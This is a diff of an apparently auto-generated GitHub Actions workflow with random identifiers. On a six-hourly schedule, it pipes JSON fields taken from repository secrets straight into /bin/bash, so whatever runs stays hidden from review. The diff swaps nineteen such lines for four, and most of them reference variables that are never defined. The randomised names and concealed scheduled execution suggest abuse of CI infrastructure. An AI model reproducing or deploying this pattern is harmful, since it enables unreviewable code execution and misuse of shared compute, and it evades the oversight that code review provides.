@@ -1,37 +1,19 @@
 name: yebawang8765
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 3/6 * * *'
-
-jobs:  # 14655
+    - cron: '52 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yebawang8765
         env:
-          a2182: ${{ secrets.a2182 }}
+          erx28503: ${{ secrets.erx28503 }}
         run: |
-          echo $a2182 | jq -r .phz53688 | /bin/bash
-          echo $ehox131 | jq -r .jlo9 | /bin/bash
-          echo $seyu1 | jq -r .t18 | /bin/bash
-          echo $w85 | jq -r .k46 | /bin/bash
-          echo $vnfy326 | jq -r .irf0 | /bin/bash
-          echo $e98714 | jq -r .aqupk500 | /bin/bash
-          echo $jsrz60 | jq -r .tge028 | /bin/bash
-          echo $vkl2 | jq -r .atq1273 | /bin/bash
-          echo $ssq7 | jq -r .gea79 | /bin/bash
-          echo $xi09 | jq -r .cbmji3 | /bin/bash
-          echo $ldtyt3 | jq -r .wyx49 | /bin/bash
-          echo $xldqd23800 | jq -r .ynef473 | /bin/bash
-          echo $vzcrr71146 | jq -r .sh88 | /bin/bash
-          echo $uxj78 | jq -r .tk4 | /bin/bash
-          echo $xait5180 | jq -r .i025 | /bin/bash
-          echo $rkd8161 | jq -r .xui954 | /bin/bash
-          echo $imhg631 | jq -r .cevz70919 | /bin/bash
-          echo $wqac012 | jq -r .bchcz808 | /bin/bash
-          echo $ayx948 | jq -r .kr900 | /bin/bash
+          echo $erx28503 | jq -r .osse52781 | /bin/bash
+          echo $v1 | jq -r .av47556 | /bin/bash
+          echo $cfzz64966 | jq -r .w26529 | /bin/bash
+          echo $i95969 | jq -r .p20242 | /bin/bash
 
